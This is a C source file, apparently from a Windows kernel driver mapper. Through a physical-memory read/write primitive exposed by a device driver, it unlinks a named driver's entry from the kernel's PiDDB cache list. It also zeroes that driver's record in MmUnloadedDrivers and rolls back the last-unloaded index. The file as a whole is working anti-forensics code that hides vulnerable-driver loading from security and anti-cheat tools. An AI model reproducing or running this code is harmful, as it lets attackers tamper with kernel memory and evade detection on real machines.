#include <windows.h>
#include <stdio.h>
#include "syscalls.h"
#include "symbols.h"
#include "physmem.h"
#include "window.h"
#include "cleanup.h"

static ULONG64 ReadKernelPtr(HANDLE device, SyscallTable* sc, ULONG64 cr3, ULONG64 va) {
    // The window is up by the time these run, and it is the only path that can
    // explain a 0 (see WindowReadKernelPtr), so route through it.
    if (PhysWindowModeEnabled()) return WindowReadKernelPtr(cr3, va, "kernel ptr");
    ULONG64 pa = VirtToPhys(device, sc, cr3, va);
    if (!pa) return 0;
    return PhysRead64(device, sc, pa);
}

static bool WriteKernelPtr(HANDLE device, SyscallTable* sc, ULONG64 cr3, ULONG64 va, ULONG64 value) {
    ULONG64 pa = VirtToPhys(device, sc, cr3, va);
    if (!pa) return false;
    return PhysWrite64(device, sc, pa, value);
}

bool CleanPiDDBCache(
    HANDLE device, SyscallTable* sc,
    ULONG64 systemCr3, KernelOffsets* offsets,
    const wchar_t* driverFileName
) {
    printf("[*] Cleaning PiDDB...\n");

    if (!offsets->PiDDBCacheList)
        printf("[-] PiDDBCacheList RVA is 0, the walk cannot work\n");

    ULONG64 listHeadVA = offsets->NtoskrnlBase + offsets->PiDDBCacheList;
    ULONG64 currentVA = ReadKernelPtr(device, sc, systemCr3, listHeadVA);

    if (!currentVA || currentVA == listHeadVA) {
        printf("[*] PiDDB empty (list head 0x%llX, flink 0x%llX)\n", listHeadVA, currentVA);
        return true;
    }

    int checked = 0;
    while (currentVA != listHeadVA && currentVA != 0 && checked < 256) {
        checked++;

        ULONG64 nameStructVA = currentVA + 0x10;
        ULONG64 nameLenPA = VirtToPhys(device, sc, systemCr3, nameStructVA);
        if (!nameLenPA) goto next;

        {
            USHORT nameLen = (USHORT)PhysRead32(device, sc, nameLenPA);
            if (nameLen == 0 || nameLen > 512) goto next;

            ULONG64 nameBufVA = ReadKernelPtr(device, sc, systemCr3, nameStructVA + 0x08);
            if (!nameBufVA) goto next;

            wchar_t name[128] = {};
            ULONG readLen = nameLen < sizeof(name) - 2 ? nameLen : sizeof(name) - 2;
            ULONG64 nameBufPA = VirtToPhys(device, sc, systemCr3, nameBufVA);
            if (!nameBufPA) goto next;
            PhysReadBuffer(device, sc, nameBufPA, name, readLen);

            if (_wcsicmp(name, driverFileName) == 0) {
                ULONG64 flink = ReadKernelPtr(device, sc, systemCr3, currentVA);
                ULONG64 blink = ReadKernelPtr(device, sc, systemCr3, currentVA + 0x08);

                if (flink && blink) {
                    WriteKernelPtr(device, sc, systemCr3, blink, flink);
                    WriteKernelPtr(device, sc, systemCr3, flink + 0x08, blink);
                    WriteKernelPtr(device, sc, systemCr3, currentVA, currentVA);
                    WriteKernelPtr(device, sc, systemCr3, currentVA + 0x08, currentVA);
                }

                WriteKernelPtr(device, sc, systemCr3, currentVA + 0x20, 0);
                WriteKernelPtr(device, sc, systemCr3, currentVA + 0x10, 0);

                printf("[+] PiDDB entry cleaned\n");
                return true;
            }
        }

    next:
        currentVA = ReadKernelPtr(device, sc, systemCr3, currentVA);
    }

    printf("[*] PiDDB entry not found (%d entries walked)\n", checked);
    return true;
}

bool PrepareMmCleanup(
    HANDLE device, SyscallTable* sc,
    ULONG64 systemCr3, KernelOffsets* offsets,
    MmCleanupContext* ctx
) {
    memset(ctx, 0, sizeof(*ctx));

    ULONG64 mmUnloadedVA = offsets->NtoskrnlBase + offsets->MmUnloadedDrivers;
    ULONG64 driversArrayVA = ReadKernelPtr(device, sc, systemCr3, mmUnloadedVA);
    if (!driversArrayVA) return false;

    ULONG64 lastIndexVA = offsets->NtoskrnlBase + offsets->MmLastUnloadedDriver;
    ULONG64 lastIndexPA = VirtToPhys(device, sc, systemCr3, lastIndexVA);
    if (!lastIndexPA) return false;

    ctx->preUnloadIndex = PhysRead32(device, sc, lastIndexPA);

    ULONG entryIndex = ctx->preUnloadIndex % 50;
    ULONG64 entryVA = driversArrayVA + (ULONG64)entryIndex * 0x28;
    printf("[*] MmUnloadedDrivers: array 0x%llX, index %u -> entry 0x%llX\n",
           driversArrayVA, entryIndex, entryVA);
    ULONG64 entryPA = VirtToPhys(device, sc, systemCr3, entryVA);
    if (!entryPA) return false;

    ULONG64 entryPageBase = entryPA & ~0xFFFULL;
    ctx->offsetInPage = (ULONG)(entryPA & 0xFFF);
    ctx->driversArrayPA = entryPA;

    // The entry is about to be zeroed in FinishMmCleanup(). If MmUnloadedDrivers
    // resolved to the wrong global that means writing 0x28 bytes of zeros over
    // an arbitrary kernel address, so verify the entry looks like an
    // UNLOADED_DRIVERS_ENTRY first and refuse otherwise.
    //   +0x10 BaseDllName (kernel VA)  +0x20 SizeOfImage
    const ULONG64 kernelVaFloor = 0xFFFFF80000000000ULL;
    ULONG64 nameVA = PhysRead64(device, sc, entryPA + 0x10);
    ULONG64 entryPoint = PhysRead64(device, sc, entryPA + 0x18);
    ULONG sizeOfImage = PhysRead32(device, sc, entryPA + 0x20);
    ULONG flink = PhysRead32(device, sc, entryPA + 0x00);
    ULONG blink = PhysRead32(device, sc, entryPA + 0x04);

    bool plausible =
        nameVA >= kernelVaFloor && (nameVA & 0xFFF) < 0x1000 &&
        entryPoint >= kernelVaFloor && (entryPoint & 0xFFF) < 0x1000 &&
        sizeOfImage > 0 && sizeOfImage < 0x10000000 &&
        (flink == 0 || (flink & 0xFFF) < 0x1000) &&
        (blink == 0 || (blink & 0xFFF) < 0x1000);

    if (!plausible) {
        // A slot that is entirely zero is simply unused: MmUnloadedDrivers is a
        // fixed 50-entry ring and the entry the unload just took is the one
        // about to be reused, so there is nothing to erase. Anything else that
        // does not look like an UNLOADED_DRIVERS_ENTRY means the RVA is wrong,
        // and writing would corrupt an unrelated kernel object.
        bool empty = nameVA == 0 && entryPoint == 0 && sizeOfImage == 0 &&
                     flink == 0 && blink == 0;
        if (empty) {
            printf("[*] MmUnloadedDrivers slot %u is already empty, nothing to clean\n", entryIndex);
        } else {
            printf("[-] MmUnloadedDrivers slot %u does not look valid "
                   "(name 0x%llX entry 0x%llX size 0x%X links %X/%X) - not writing\n",
                   entryIndex, nameVA, entryPoint, sizeOfImage, flink, blink);
            printf("[-] Check the MmUnloadedDrivers RVA (0x%llX)\n", offsets->MmUnloadedDrivers);
        }
        return false;
    }

    // pre-map pages — mappings survive driver unload
    ctx->mappedDriversPage = PhysMap(device, sc, entryPageBase, 0x1000);
    if (!ctx->mappedDriversPage) return false;

    ULONG64 indexPageBase = lastIndexPA & ~0xFFFULL;
    ctx->indexOffsetInPage = (ULONG)(lastIndexPA & 0xFFF);
    ctx->indexPA = lastIndexPA;

    ctx->mappedIndexPage = PhysMap(device, sc, indexPageBase, 0x1000);
    if (!ctx->mappedIndexPage) return false;

    printf("[+] MmUnloadedDrivers pages pre-mapped\n");
    return true;
}

bool FinishMmCleanup(MmCleanupContext* ctx) {
    if (!ctx->mappedDriversPage || !ctx->mappedIndexPage) return false;

    BYTE* entryPtr = (BYTE*)ctx->mappedDriversPage + ctx->offsetInPage;
    memset(entryPtr, 0, 0x28);

    ULONG* indexPtr = (ULONG*)((BYTE*)ctx->mappedIndexPage + ctx->indexOffsetInPage);
    ULONG cur = *indexPtr;
    *indexPtr = cur > 0 ? cur - 1 : 49;

    printf("[+] MmUnloadedDrivers cleaned\n");
    return true;
}
